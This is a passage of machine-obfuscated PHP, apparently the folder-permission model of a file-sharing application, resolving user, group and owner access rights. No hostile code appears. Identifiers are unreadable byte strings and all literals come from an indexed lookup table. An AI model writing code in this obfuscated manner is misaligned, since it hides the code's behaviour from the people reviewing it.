$Üä¡ÛŠâ =& $_SERVER[÷åé¼î]; $óÜû½·ö = $this->getAllChildrenByUser($Ë££¥°Ã, $Ş®—Ëº¸); if (!$á™ÍËØì || !$óÜû½·ö) { return !1; } foreach ($óÜû½·ö as $ØëÜéæê) { $Åß’¹¹‰ = array(); foreach ($ØëÜéæê[$Üä¡ÛŠâ[2165]] as $ÒÁŠÒİ) { $¤÷ ·Ï¥ = $ÒÁŠÒİ[$Üä¡ÛŠâ[524]]; $Ø Øó²ï = $ÒÁŠÒİ[$Üä¡ÛŠâ[1779]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $èúÄñî× = $ÒÁŠÒİ[$Üä¡ÛŠâ[1779]] ? $ÒÁŠÒİ[$Üä¡ÛŠâ[1779]] : $ÒÁŠÒİ[$Üä¡ÛŠâ[1977]]; if ($ÒÁŠÒİ[$Üä¡ÛŠâ[1779]] && $ÒÁŠÒİ[$Üä¡ÛŠâ[1779]] == $Ş®—Ëº¸) { continue; } $Åß’¹¹‰[] = array($Üä¡ÛŠâ[193] => $ØëÜéæê[$Üä¡ÛŠâ[193]], $Üä¡ÛŠâ[190] => $Ø Øó²ï, $Üä¡ÛŠâ[553] => intval($èúÄñî×), $Üä¡ÛŠâ[2085] => isset($¤÷ ·Ï¥[$Üä¡ÛŠâ[459]]) ? intval($¤÷ ·Ï¥[$Üä¡ÛŠâ[459]]) : 0, $Üä¡ÛŠâ[2145] => isset($¤÷ ·Ï¥[$Üä¡ÛŠâ[2145]]) ? intval($¤÷ ·Ï¥[$Üä¡ÛŠâ[2145]]) : -1); } $Åß’¹¹‰[] = array($Üä¡ÛŠâ[193] => $ØëÜéæê[$Üä¡ÛŠâ[193]], $Üä¡ÛŠâ[190] => SourceModel::TYPE_USER, $Üä¡ÛŠâ[553] => intval($Ş®—Ëº¸), $Üä¡ÛŠâ[2085] => intval($á™ÍËØì), $Üä¡ÛŠâ[2145] => -1); $this->where(array($Üä¡ÛŠâ[475] => $ØëÜéæê[$Üä¡ÛŠâ[193]]))->delete(); $this->addAll($Åß’¹¹‰); } return !0; } public function get($æ°ËÑÈ–) { $Ìóº½©Õ = $this->getSourceList(array($æ°ËÑÈ–), !0); return $Ìóº½©Õ[0]; } public function getSourceList($İª£Ó, $èÊÌÑ©• = false, $õ§¸åûì = false) { $­€¼ ø· =& $_SERVER[÷åé¼î]; if (!$İª£Ó) { return array(); } $´±„µõ¼ = Model($­€¼ ø·[1414]); if (!$èÊÌÑ©• && count($İª£Ó) == 1) { $èÊÌÑ©• = array(); $èÊÌÑ©•[$İª£Ó[0]] = $´±„µõ¼->sourceInfo($İª£Ó[0]); } if (!$èÊÌÑ©•) { $è¶«ŞùĞ = array($­€¼ ø·[475] => array($­€¼ ø·[476], $İª£Ó)); $èÊÌÑ©• = $´±„µõ¼->field($­€¼ ø·[2169])->where($è¶«ŞùĞ)->select(); $èÊÌÑ©• = array_to_keyvalue($èÊÌÑ©•, $­€¼ ø·[193]); } $·åİ = $İª£Ó; foreach ($èÊÌÑ©• as $üıä†¿ => $š”Ì®´¼) { $‚¦æ–·Û = $´±„µõ¼->parentLevelArray($š”Ì®´¼[$­€¼ ø·[568]]); $·åİ = array_merge($·åİ, array($üıä†¿), array_reverse($‚¦æ–·Û)); } $·åİ = array_values(array_unique($·åİ)); if (!$·åİ) { return array(); } $×ÁÏäŞô = $this->sourceAuthSelect($·åİ); $µ¼Ë–×­ = array(); foreach ($·åİ as $ºˆŠ›Ûë) { if (isset($×ÁÏäŞô[$ºˆŠ›Ûë])) { $µ¼Ë–×­[$ºˆŠ›Ûë] = $×ÁÏäŞô[$ºˆŠ›Ûë]; } } $»îïæñ™ = $this->userIsRoot($õ§¸åûì); $éÃ¢õ¸è = AuthModel::authAll(); $Ğ âïºÄ = array($­€¼ ø·[472] => $éÃ¢õ¸è, $­€¼ ø·[2170] => array($­€¼ ø·[477] => 0, $­€¼ ø·[1983] => $éÃ¢õ¸è, $­€¼ ø·[478] => LNG($­€¼ ø·[2171]), $­€¼ ø·[2000] => $­€¼ ø·[2172])); $ºéô™ì° = array(); foreach ($èÊÌÑ©• as $ºˆŠ›Ûë => $±´È…æÔ) { if ($»îïæñ™ && $GLOBALS[$­€¼ ø·[6]][$­€¼ ø·[1996]]) { $ºéô™ì°[$ºˆŠ›Ûë] = $Ğ âïºÄ; continue; } $ºéô™ì°[$ºˆŠ›Ûë] = $this->makeSourceAuth($±´È…æÔ, $µ¼Ë–×­, $õ§¸åûì); } return $ºéô™ì°; } public function authDeepCheck($œÖÜ¾¿, $ã èå¶‚ = false) { $şÂ·Ã³Ó =& $_SERVER[÷åé¼î]; $ã èå¶‚ = $ã èå¶‚ ? $ã èå¶‚ : USER_ID; $ÇëÆ¾Å = $this->makeAuthDeep($ã èå¶‚); if (!in_array($œÖÜ¾¿, $ÇëÆ¾Å[$şÂ·Ã³Ó[2173]])) { return !1; } $şÍùæ† = array(); foreach ($ÇëÆ¾Å[$şÂ·Ã³Ó[2174]] as $‚İ»éÍŒ => $ï¹éøøÒ) { if (!in_array($œÖÜ¾¿, $ï¹éøøÒ)) { continue; } $şÍùæ†[] = $‚İ»éÍŒ; } if (!$şÍùæ†) { return !1; } $ÎÅ²ÛÜÓ = $şÍùæ† ? $şÍùæ†[0] : $œÖÜ¾¿; return array($şÂ·Ã³Ó[472] => -1, $şÂ·Ã³Ó[524] => array($şÂ·Ã³Ó[477] => $şÂ·Ã³Ó[1267], $şÂ·Ã³Ó[1983] => $şÂ·Ã³Ó[228], $şÂ·Ã³Ó[478] => LNG($şÂ·Ã³Ó[2175]), $şÂ·Ã³Ó[2000] => $şÂ·Ã³Ó[2176]), $şÂ·Ã³Ó[2177] => LNG($şÂ·Ã³Ó[2178]), $şÂ·Ã³Ó[2179] => $this->sourceAuthInfo($ÎÅ²ÛÜÓ)); } protected function makeAuthDeep($Ü­°é’¿ = false) { $ÛëçŞ†í =& $_SERVER[÷åé¼î]; static $±“å‚Şˆ = array(); $Ü­°é’¿ = $Ü­°é’¿ ? $Ü­°é’¿ : USER_ID; if (isset($±“å‚Şˆ[$Ü­°é’¿])) { return $±“å‚Şˆ[$Ü­°é’¿]; } $˜¼åè¾Ó = Model($ÛëçŞ†í[2180])->listData(); $õâ™şè = array(); foreach ($˜¼åè¾Ó as $İŸ‚ˆ†ø) { if ($İŸ‚ˆ†ø[$ÛëçŞ†í[471]] == 0 && $İŸ‚ˆ†ø[$ÛëçŞ†í[1999]] == $ÛëçŞ†í[91]) { $õâ™şè[] = $İŸ‚ˆ†ø[$ÛëçŞ†í[459]]; } } $™Ííˆ¾ë = $this->userGroupParents($Ü­°é’¿); $Ÿ˜Ù÷ = array($ÛëçŞ†í[190] => SourceModel::TYPE_USER, $ÛëçŞ†í[553] => $Ü­°é’¿); if ($™Ííˆ¾ë) { $Ÿ˜Ù÷ = array(array($ÛëçŞ†í[190] => SourceModel::TYPE_USER, $ÛëçŞ†í[553] => $Ü­°é’¿), array($ÛëçŞ†í[190] => SourceModel::TYPE_GROUP, $ÛëçŞ†í[553] => array($ÛëçŞ†í[476], $™Ííˆ¾ë)), $ÛëçŞ†í[1072] => $ÛëçŞ†í[2079]); } $š¢¼ê‘â = $this->field($ÛëçŞ†í[2181])->where($Ÿ˜Ù÷)->select(); $Ï§ÀÅ¯Õ = array(); $¥èÇ’à¿ = array_to_keyvalue_group($š¢¼ê‘â, $ÛëçŞ†í[193]); foreach ($¥èÇ’à¿ as $§ÊÅŞ¿Ü => $Ğ§Í–ª) { $˜Ì­©­» = $this->authArrayCheck($Ğ§Í–ª, $Ü­°é’¿); if ($˜Ì­©­»[$ÛëçŞ†í[472]] > 0) { $Ï§ÀÅ¯Õ[] = $§ÊÅŞ¿Ü . $ÛëçŞ†í[12]; } } if ($™Ííˆ¾ë) { $Î³âÇŒˆ = Model($ÛëçŞ†í[569]); foreach ($™Ííˆ¾ë as $ä‘áç¶³) { $¾³£é×‹ = $Î³âÇŒˆ->getInfo($ä‘áç¶³); if (!$¾³£é×‹ || !is_array($¾³£é×‹[$ÛëçŞ†í[90]])) { continue; } $Ï§ÀÅ¯Õ[] = $¾³£é×‹[$ÛëçŞ†í[90]][$ÛëçŞ†í[193]]; } } $úïÊÓù = array(); $ôüÈ€Ï  = $™Ííˆ¾ë; $ˆş­ñı = Model($ÛëçŞ†í[1414]); $Î³âÇŒˆ = Model($ÛëçŞ†í[569]); $îˆ÷ØáÑ = array(); $úİ€ìÌÅ = array(); $­É£——ú = array(); $ñîî­Õ» = array(); if ($Ï§ÀÅ¯Õ) { $û®¬û™Å = $ˆş­ñı->where(array($ÛëçŞ†í[193] => array($ÛëçŞ†í[476], $Ï§ÀÅ¯Õ)))->select(); foreach ($û®¬û™Å as $ÂÉÉ×¨ä) { $©í‰´Ü¹ = $ˆş­ñı->parentLevelArray($ÂÉÉ×¨ä[$ÛëçŞ†í[568]]); $úïÊÓù = array_merge($úïÊÓù, $©í‰´Ü¹); $ôüÈ€Ï [] = $ÂÉÉ×¨ä[$ÛëçŞ†í[553]]; $îˆ÷ØáÑ[$ÂÉÉ×¨ä[$ÛëçŞ†í[193]]] = $©í‰´Ü¹; $úİ€ìÌÅ[$ÂÉÉ×¨ä[$ÛëçŞ†í[193]]] = $ÂÉÉ×¨ä[$ÛëçŞ†í[553]]; } } $ôüÈ€Ï  = array_values(array_unique($ôüÈ€Ï )); $“Ÿ÷í®µ = $ôüÈ€Ï ; foreach ($“Ÿ÷í®µ as $ä‘áç¶³) { $¾³£é×‹ = $Î³âÇŒˆ->getInfo($ä‘áç¶³); $©í‰´Ü¹ = $ˆş­ñı->parentLevelArray($¾³£é×‹[$ÛëçŞ†í[568]]); $ôüÈ€Ï  = array_merge($ôüÈ€Ï , $©í‰´Ü¹); } $ôüÈ€Ï  = array_values(array_unique($ôüÈ€Ï )); foreach ($ôüÈ€Ï  as $ä‘áç¶³) { $¾³£é×‹ = $Î³âÇŒˆ->getInfo($ä‘áç¶³); $úïÊÓù[] = $¾³£é×‹[$ÛëçŞ†í[90]][$ÛëçŞ†í[193]]; $­É£——ú[$ä‘áç¶³] = $¾³£é×‹[$ÛëçŞ†í[90]][$ÛëçŞ†í[193]]; $ñîî­Õ»[$ä‘áç¶³] = $ˆş­ñı->parentLevelArray($¾³£é×‹[$ÛëçŞ†í[568]]); } foreach ($îˆ÷ØáÑ as $ÜÃ­„ => $…Ê“Úƒ) { $ÙÊ Öç = $úİ€ìÌÅ[$ÜÃ­„]; if (!$ÙÊ Öç || !$­É£——ú[$ÙÊ Öç]) { continue; } $›ö³ƒû = array(); foreach ($ñîî­Õ»[$ÙÊ Öç] as $ä‘áç¶³) { $›ö³ƒû[] = $­É£——ú[$ä‘áç¶³]; } $îˆ÷ØáÑ[$ÜÃ­„] = array_merge($›ö³ƒû, $…Ê“Úƒ); } $úïÊÓù = array_values(array_unique($úïÊÓù)); $ôÑ‘»åÁ = array($ÛëçŞ†í[2173] => $úïÊÓù, $ÛëçŞ†í[2174] => $îˆ÷ØáÑ); $±“å‚Şˆ[$Ü­°é’¿] = $ôÑ‘»åÁ; return $ôÑ‘»åÁ; } private function makeSourceAuth($å¸ßÂ±İ, $şèÌÛ…è, $³¶‹ßÙ” = false) { $…¯œôÀö =& $_SERVER[÷åé¼î]; $ÛÕŞôïû = $…¯œôÀö[91]; $€ìÃë­ä = $å¸ßÂ±İ[$…¯œôÀö[553]]; $‰ŸÓêëµ = $å¸ßÂ±İ[$…¯œôÀö[190]] == SourceModel::TYPE_GROUP; $¾Ûèà²È = $‰ŸÓêëµ ? $this->groupRootAuth($€ìÃë­ä, $³¶‹ßÙ”) : !1; if ($¾Ûèà²È && Model($…¯œôÀö[555])->authCheckAction($¾Ûèà²È[$…¯œôÀö[471]], $…¯œôÀö[1998])) { return $this->groupAuthInfo($¾Ûèà²È, $€ìÃë­ä); } $®ù’¶ş‰ = Model($…¯œôÀö[1414])->parentLevelArray($å¸ßÂ±İ[$…¯œôÀö[568]]); $®ù’¶ş‰ = array_merge(array($å¸ßÂ±İ[$…¯œôÀö[193]]), array_reverse($®ù’¶ş‰)); $´Ø–¿é = !1; foreach ($®ù’¶ş‰ as $˜ğ±Õ¹å) { if (!isset($şèÌÛ…è[$˜ğ±Õ¹å])) { continue; } $·¼âîû‚ = $this->authMake($şèÌÛ…è[$˜ğ±Õ¹å], $³¶‹ßÙ”); if ($·¼âîû‚[$…¯œôÀö[524]]) { $´Ø–¿é = $·¼âîû‚; break; } } if (!$‰ŸÓêëµ) { return $´Ø–¿é; } if (!$´Ø–¿é && $¾Ûèà²È) { $´Ø–¿é = $this->groupAuthInfo($¾Ûèà²È, $€ìÃë­ä); } if (!$´Ø–¿é) { $èÕ¼áÎø = Model($…¯œôÀö[569])->getInfo($€ìÃë­ä); $Ş†Œúµ¶ = explode($…¯œôÀö[50], trim($èÕ¼áÎø[$…¯œôÀö[568]], $…¯œôÀö[50])); $Ş†Œúµ¶ = array_reverse($Ş†Œúµ¶); foreach ($Ş†Œúµ¶ as $›‘—ß”) { if ($›‘—ß” == $…¯œôÀö[228] || $›‘—ß” == $ÛÕŞôïû) { continue; } $¸Øˆ÷¶ğ = $this->groupRootAuth($›‘—ß”, $³¶‹ßÙ”); if (!$¸Øˆ÷¶ğ) { continue; } $´Ø–¿é = $this->groupAuthInfo($¸Øˆ÷¶ğ, $›‘—ß”); break; } } if (!$´Ø–¿é || $´Ø–¿é[$…¯œôÀö[472]] <= 0) { $í¹º’× = $this->authDeepCheck($å¸ßÂ±İ[$…¯œôÀö[193]], $³¶‹ßÙ”); if ($í¹º’×) { $´Ø–¿é = $í¹º’×; } } return $´Ø–¿é; } private function userIsRoot($„«Ê“üñ = false) { $ï²‚°Æû =& $_SERVER[÷åé¼î]; if (!$„«Ê“üñ && KodUser::isRoot()) { return !0; } $‚ŒÑè÷Ñ = Model($ï²‚°Æû[582])->getInfo($„«Ê“üñ); $¹ıîÓ£¢ = Model($ï²‚°Æû[2182])->listData($‚ŒÑè÷Ñ[$ï²‚°Æû[2183]]); if ($¹ıîÓ£¢ && $¹ıîÓ£¢[$ï²‚°Æû[559]][$ï²‚°Æû[2184]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ß ô¹ì×) { $³¥˜”‡Ö =& $_SERVER[÷åé¼î]; $© Ö¯®š = Model($³¥˜”‡Ö[1414]); $óéÆöà = $© Ö¯®š->sourceInfo($ß ô¹ì×); if (!$óéÆöà) { return !1; } $© Ö¯®š->groupPathDisplay($óéÆöà); $ÜğƒÚù¼ = array($óéÆöà); $ÜğƒÚù¼ = $© Ö¯®š->_listAppendPath($ÜğƒÚù¼); $óéÆöà = $ÜğƒÚù¼[0]; $§ÓÈğ½® = $óéÆöà[$³¥˜”‡Ö[566]]; if (isset($óéÆöà[$³¥˜”‡Ö[574]])) { $÷ÅŠè‰ó = explode($³¥˜”‡Ö[8], trim($óéÆöà[$³¥˜”‡Ö[566]], $³¥˜”‡Ö[8])); array_shift($÷ÅŠè‰ó); $§ÓÈğ½® = $óéÆöà[$³¥˜”‡Ö[572]] . $³¥˜”‡Ö[2185] . implode($³¥˜”‡Ö[8], $÷ÅŠè‰ó); } return array($³¥˜”‡Ö[478] => $óéÆöà[$³¥˜”‡Ö[32]], $³¥˜”‡Ö[87] => KodIO::make($óéÆöà[$³¥˜”‡Ö[193]]), $³¥˜”‡Ö[2186] => $§ÓÈğ½®); } private function groupAuthInfo($ŒÚÀå½¿, $À’ÂÀ¤Î) { $’õì›â =& $_SERVER[÷åé¼î]; $ÙÕÛ™ Î = Model($’õì›â[569])->getInfo($À’ÂÀ¤Î); return array($’õì›â[2187] => intval($ŒÚÀå½¿[$’õì›â[471]]), $’õì›â[2170] => $ŒÚÀå½¿, $’õì›â[2188] => LNG($’õì›â[2189]), $’õì›â[2179] => array($’õì›â[478] => $ÙÕÛ™ Î[$’õì›â[32]], $’õì›â[87] => KodIO::make($ÙÕÛ™ Î[$’õì›â[90]][$’õì›â[193]]), $’õì›â[2186] => $ÙÕÛ™ Î[$’õì›â[573]])); } protected function groupRootAuth($Ÿå÷”Ç‰, $©Ì½ÇÁ‘ = false) { $´ÜıÇŞ =& $_SERVER[÷åé¼î]; $©Ì½ÇÁ‘ = $©Ì½ÇÁ‘ ? $©Ì½ÇÁ‘ : USER_ID; $ÁôÏ²˜² = $©Ì½ÇÁ‘ . $´ÜıÇŞ[2190] . $Ÿå÷”Ç‰; static $ß¯êÊ¹è = array(); if (isset($ß¯êÊ¹è[$ÁôÏ²˜²])) { return $ß¯êÊ¹è[$ÁôÏ²˜²]; } $ÛÈšÎ‰Ô = Model($´ÜıÇŞ[569])->getInfo($Ÿå÷”Ç‰); $‡ÖÈƒôº = $this->userGroupList($©Ì½ÇÁ‘); $ùÈ¯Âƒº = isset($‡ÖÈƒôº[$Ÿå÷”Ç‰]) ? $‡ÖÈƒôº[$Ÿå÷”Ç‰][$´ÜıÇŞ[471]] : !1; if ($ùÈ¯Âƒº && Model($´ÜıÇŞ[555])->authCheckAction($ùÈ¯Âƒº[$´ÜıÇŞ[471]], $´ÜıÇŞ[1998])) { $ß¯êÊ¹è[$ÁôÏ²˜²] = $ùÈ¯Âƒº; return $ùÈ¯Âƒº; } $³°ş‘ñ÷ = $this->sourceAuthSelect($ÛÈšÎ‰Ô[$´ÜıÇŞ[90]][$´ÜıÇŞ[193]]); $ûŸÏß• = $³°ş‘ñ÷ ? $this->authMake($³°ş‘ñ÷, $©Ì½ÇÁ‘) : !1; $·íòİÒ = $ûŸÏß• ? $ûŸÏß•[$´ÜıÇŞ[524]] : !1; $ß¯êÊ¹è[$ÁôÏ²˜²] = $·íòİÒ ? $·íòİÒ : $ùÈ¯Âƒº; return $ß¯êÊ¹è[$ÁôÏ²˜²]; } public function authOwnerApply($®µü•ñˆ) { $À¨”Š¹¡ =& $_SERVER[÷åé¼î]; if (empty($®µü•ñˆ[$À¨”Š¹¡[471]]) || isset($®µü•ñˆ[$À¨”Š¹¡[2191]]) && $®µü•ñˆ[$À¨”Š¹¡[2191]]) { return $®µü•ñˆ; } if (AuthModel::authCheckRoot($®µü•ñˆ[$À¨”Š¹¡[471]][$À¨”Š¹¡[472]])) { return $®µü•ñˆ; } $‚Àè¾×ª = Model($À¨”Š¹¡[1414])->parentLevelArray($®µü•ñˆ[$À¨”Š¹¡[568]]); $‚Àè¾×ª = array_merge(array($®µü•ñˆ[$À¨”Š¹¡[193]]), array_reverse($‚Àè¾×ª)); $®Î–¸’ = $this->sourceAuthSelect($‚Àè¾×ª); $˜ù¦š¼¡ = array(); $‚×¯§àë = array(); foreach ($®Î–¸’ as $‰¬‰›×¯ => $¦©ºİıš) { $óáÏŸŞ = $this->authFolderOwnerUser($¦©ºİıš); $˜ù¦š¼¡[$‰¬‰›×¯] = $óáÏŸŞ; $‚×¯§àë = array_merge($‚×¯§àë, $óáÏŸŞ[$À¨”Š¹¡[646]]); if ($óáÏŸŞ[$À¨”Š¹¡[2192]]) { break; } } if (count($‚×¯§àë) == 0) { $‚×¯§àë = $this->authFolderOwnerGroup($®µü•ñˆ[$À¨”Š¹¡[553]]); } $‚×¯§àë = array_unique($‚×¯§àë); if (AuthModel::authCheckRoot($®µü•ñˆ[$À¨”Š¹¡[471]][$À¨”Š¹¡[472]])) { $‚×¯§àë[] = USER_ID; } $®µü•ñˆ[$À¨”Š¹¡[471]][$À¨”Š¹¡[2193]] = Model($À¨”Š¹¡[561])->userListInfo($‚×¯§àë); return $®µü•ñˆ; } private function authFolderOwnerGroup($ş¾‹½Õ’) { $ùÑ’×ªÀ =& $_SERVER[÷åé¼î]; $İÏ‚¡äù = Model($ùÑ’×ªÀ[2071])->where(array($ùÑ’×ªÀ[1977] => $ş¾‹½Õ’))->select(); $¯…ÔÚÎ‹ = array(); if (!$İÏ‚¡äù) { return $¯…ÔÚÎ‹; } foreach ($İÏ‚¡äù as $êÉ×ò—) { $³ùª˜ç  = $this->authInfo($êÉ×ò—); if (AuthModel::authCheckRoot($³ùª˜ç [$ùÑ’×ªÀ[471]])) { $¯…ÔÚÎ‹[] = $êÉ×ò—[$ùÑ’×ªÀ[1779]]; } } return $¯…ÔÚÎ‹; } private function authFolderOwnerUser($Î¹ñŠ´) { $“·õ°àû =& $_SERVER[÷åé¼î]; $µ°º„Üö = array(); $½ê˜Öœâ = !1; foreach ($Î¹ñŠ´ as $Ó¿íÅñ) { $Ï©³ô = $this->authInfo($Ó¿íÅñ); if ($Ó¿íÅñ[$“·õ°àû[553]] == $“·õ°àû[228]) { $½ê˜Öœâ = !0; } if ($Ó¿íÅñ[$“·õ°àû[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Ï©³ô[$“·õ°àû[471]])) { $µ°º„Üö[] = $Ó¿íÅñ[$“·õ°àû[553]]; } } } return array($“·õ°àû[646] => $µ°º„Üö, $“·õ°àû[2192] => $½ê˜Öœâ); } public function authMake($¾á†ìÑ«, $€äÅ×Öâ = false) { $°¨ş¤ûÌ =& $_SERVER[÷åé¼î]; $Œ«½Ìü = $this->authArrayCheck($¾á†ìÑ«, $€äÅ×Öâ); if ($Œ«½Ìü[$°¨ş¤ûÌ[2194]]) { $Œ«½Ìü[$°¨ş¤ûÌ[2194]] = $this->sourceAuthInfo($Œ«½Ìü[$°¨ş¤ûÌ[2194]]); } return $Œ«½Ìü; } public function authArrayCheck($Á–ŞÃßˆ, $áÉÄ‰Öê = false) { $Ûˆ©¸Ì =& $_SERVER[÷åé¼î]; if (!$Á–ŞÃßˆ) { return array($Ûˆ©¸Ì[472] => 0, $Ûˆ©¸Ì[524] => !1); } $áÉÄ‰Öê = $áÉÄ‰Öê ? $áÉÄ‰Öê : USER_ID; $€ë÷À ¾ = 0; $°¿¸¢ÓŒ = 0; $¢á«Úî = 0; $¬êûÉî = 0; $¶´Í†µğ = 0; $Ÿ²È²¥° = 0; $ ‘şÛ¿· = 1000; $ ğ¶º› = 0; $ĞšŒñ´• = 0; $äÓãŞØ• = 0; $€åœëƒ˜ = 0; $ÀåŸ«ÎÃ = array($Ûˆ©¸Ì[193] => 0); foreach ($Á–ŞÃßˆ as $ÀåŸ«ÎÃ) { $ìñ—Íè“ = $this->authInfo($ÀåŸ«ÎÃ); if (!$ìñ—Íè“) { continue; } $„’çãÇã = $ÀåŸ«ÎÃ[$Ûˆ©¸Ì[553]]; $‘…ò£¹ = intval($ìñ—Íè“[$Ûˆ©¸Ì[471]]); if ($ÀåŸ«ÎÃ[$Ûˆ©¸Ì[190]] == SourceModel::TYPE_USER && $„’çãÇã == $áÉÄ‰Öê) { $€ë÷À ¾ = !0; $¢á«Úî = $ìñ—Íè“; $°¿¸¢ÓŒ = $‘…ò£¹; } else { if ($ÀåŸ«ÎÃ[$Ûˆ©¸Ì[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($„’çãÇã, $áÉÄ‰Öê)) { $¬êûÉî = !0; $úè‡íñ· = $this->groupStepToUserGroup($„’çãÇã, $áÉÄ‰Öê); if ($úè‡íñ· < $ ‘şÛ¿·) { $ ‘şÛ¿· = $úè‡íñ·; $¶´Í†µğ = $‘…ò£¹; $Ÿ²È²¥° = $ìñ—Íè“; $ ğ¶º› = $„’çãÇã; } if ($úè‡íñ· == $ ‘şÛ¿· && $‘…ò£¹ >= $¶´Í†µğ) { $¶´Í†µğ = $‘…ò£¹; $Ÿ²È²¥° = $ìñ—Íè“; $ ğ¶º› = $„’çãÇã; } } else { if ($„’çãÇã == $Ûˆ©¸Ì[228]) { $ĞšŒñ´• = !0; $€åœëƒ˜ = $ìñ—Íè“; $äÓãŞØ• = $‘…ò£¹; } } } } if ($€ë÷À ¾) { $˜€‹ŒÜŞ = $°¿¸¢ÓŒ; $ìñ—Íè“ = $¢á«Úî; $ñŸàü© = LNG($Ûˆ©¸Ì[2195]); } else { if ($¬êûÉî) { $˜€‹ŒÜŞ = $¶´Í†µğ; $ìñ—Íè“ = $Ÿ²È²¥°; $ó›®áË¤ = Model($Ûˆ©¸Ì[569])->getInfo($ ğ¶º›); $ñŸàü© = $Ûˆ©¸Ì[176] . $ó›®áË¤[$Ûˆ©¸Ì[573]] . $Ûˆ©¸Ì[2196] . LNG($Ûˆ©¸Ì[2197]); } else { if ($ĞšŒñ´•) { $˜€‹ŒÜŞ = $äÓãŞØ•; $ìñ—Íè“ = $€åœëƒ˜; $ñŸàü© = LNG($Ûˆ©¸Ì[2167]); } else { $˜€‹ŒÜŞ = 0; $ìñ—Íè“ = !1; $ñŸàü© = $Ûˆ©¸Ì[12]; } } } $Å‚á‘‰Å = array($Ûˆ©¸Ì[2187] => intval($˜€‹ŒÜŞ), $Ûˆ©¸Ì[2170] => $ìñ—Íè“, $Ûˆ©¸Ì[2188] => $ñŸàü©, $Ûˆ©¸Ì[2179] => $ÀåŸ«ÎÃ[$Ûˆ©¸Ì[193]]); return $Å‚á‘‰Å; } private function groupContainUser($ğ¸¤«¡ , $‰´ĞĞÂ¯ = false) { return in_array($ğ¸¤«¡ , $this->userGroupParents($‰´ĞĞÂ¯)); } private function groupStepToUserGroup($„¹¤ÀæŠ, $½×¥áÀ  = false) { $ŸË…’…Ç =& $_SERVER[÷åé¼î]; $½ÎôîØÃ = $this->userGroupList($½×¥áÀ ); $Îª¯ºØ = 1000; $†©áæƒÈ = $GLOBALS[$ŸË…’…Ç[6]][$ŸË…’…Ç[92]][$ŸË…’…Ç[2084]] == 1; $Š¦ŞÑ¥ä = $†©áæƒÈ ? 3 : 2; foreach ($½ÎôîØÃ as $÷ò‘Ï™×) { if ($÷ò‘Ï™×[$ŸË…’…Ç[1977]] == $„¹¤ÀæŠ) { return 0; } $¸ì‚ÙùÂ = explode($ŸË…’…Ç[50], trim($÷ò‘Ï™×[$ŸË…’…Ç[568]], $ŸË…’…Ç[50])); if ($¸ì‚ÙùÂ[0] == $ŸË…’…Ç[228] && count($¸ì‚ÙùÂ) > $Š¦ŞÑ¥ä) { $ÈƒÔ’»Í = array_reverse(array_slice($¸ì‚ÙùÂ, $Š¦ŞÑ¥ä)); $÷¶€®£› = array_search($„¹¤ÀæŠ, $ÈƒÔ’»Í); if ($÷¶€®£› !== !1 && $÷¶€®£› + 1 <= $Îª¯ºØ) { $Îª¯ºØ = $÷¶€®£› + 1; } } } return $Îª¯ºØ; } private function userGroupList($„ëÉº§ = false) { $üÚÔÒô™ =& $_SERVER[÷åé¼î]; static $Ä‡­ÆÆÁ = array(); if (isset($Ä‡­ÆÆÁ[$„ëÉº§])) { return $Ä‡­ÆÆÁ[$„ëÉº§]; } $„†£¸çš = Model($üÚÔÒô™[582])->getInfo($„ëÉº§); $Ä‡­ÆÆÁ[$„ëÉº§] = array_to_keyvalue($„†£¸çš[$üÚÔÒô™[2168]], $üÚÔÒô™[1977]); return $Ä‡­ÆÆÁ[$„ëÉº§]; } public function userGroupParents($æ¦š»Ø¹) { $µˆ´åôñ =& $_SERVER[÷åé¼î]; static $Ññ‹—§Ü = array(); $æ¦š»Ø¹ = $æ¦š»Ø¹ ? $æ¦š»Ø¹ : USER_ID; if (isset($Ññ‹—§Ü[$æ¦š»Ø¹])) { return $Ññ‹—§Ü[$æ¦š»Ø¹]; } $êØô¸³§ = $this->userGroupList($æ¦š»Ø¹); $Ò¡±¿àŠ = array(); $êØ¶÷ñ = $GLOBALS[$µˆ´åôñ[6]][$µˆ´åôñ[92]][$µˆ´åôñ[2084]] == 1; $Šî¹²ğ´ = $êØ¶÷ñ ? 3 : 2; foreach ($êØô¸³§ as $Ï­Ší÷¾) { $«ßÂ–’ = array($Ï­Ší÷¾[$µˆ´åôñ[1977]]); $¬àû‡¶à = explode($µˆ´åôñ[50], trim($Ï­Ší÷¾[$µˆ´åôñ[568]], $µˆ´åôñ[50])); if ($¬àû‡¶à[0] == $µˆ´åôñ[228] && count($¬àû‡¶à) > $Šî¹²ğ´) { $…ëŠĞµ = array_slice($¬àû‡¶à, $Šî¹²ğ´); $«ßÂ–’ = array_merge($«ßÂ–’, array_reverse($…ëŠĞµ)); } $Ò¡±¿àŠ = array_merge($Ò¡±¿àŠ, $«ßÂ–’); } $Ññ‹—§Ü[$æ¦š»Ø¹] = array_unique($Ò¡±¿àŠ); return $Ññ‹—§Ü[$æ¦š»Ø¹]; } public function authTargetInfoMake($´’â„ÁÃ) { $Ğ®•Íˆ =& $_SERVER[÷åé¼î]; $Êİ”…îØ = array(); $ÜùÁ˜­à = array(); foreach ($´’â„ÁÃ as $¦°ÇÔ´é) { if ($¦°ÇÔ´é[$Ğ®•Íˆ[190]] == SourceModel::TYPE_USER) { $Êİ”…îØ[] = intval($¦°ÇÔ´é[$Ğ®•Íˆ[553]]); } else { if ($¦°ÇÔ´é[$Ğ®•Íˆ[190]] == SourceModel::TYPE_GROUP) { $ÜùÁ˜­à[] = intval($¦°ÇÔ´é[$Ğ®•Íˆ[553]]); } } } if ($Êİ”…îØ) { $Êİ”…îØ = Model($Ğ®•Íˆ[561])->userListInfo($Êİ”…îØ); } if ($ÜùÁ˜­à) { $úÄ²Í¸ = array($Ğ®•Íˆ[2069] => array($Ğ®•Íˆ[476], $ÜùÁ˜­à)); $ÜùÁ˜­à = Model($Ğ®•Íˆ[569])->field($Ğ®•Íˆ[2198])->where($úÄ²Í¸)->select(); $ÜùÁ˜­à = array_to_keyvalue($ÜùÁ˜­à, $Ğ®•Íˆ[1977]); } return array($Ğ®•Íˆ[2199] => $Êİ”…îØ, $Ğ®•Íˆ[2200] => $ÜùÁ˜­à); } public function authInfo($š§‹úÛ) { $¢èĞŞ  =& $_SERVER[÷åé¼î]; if ($š§‹úÛ[$¢èĞŞ [2085]]) { $¢Ûä×Í¬ = Model($¢èĞŞ 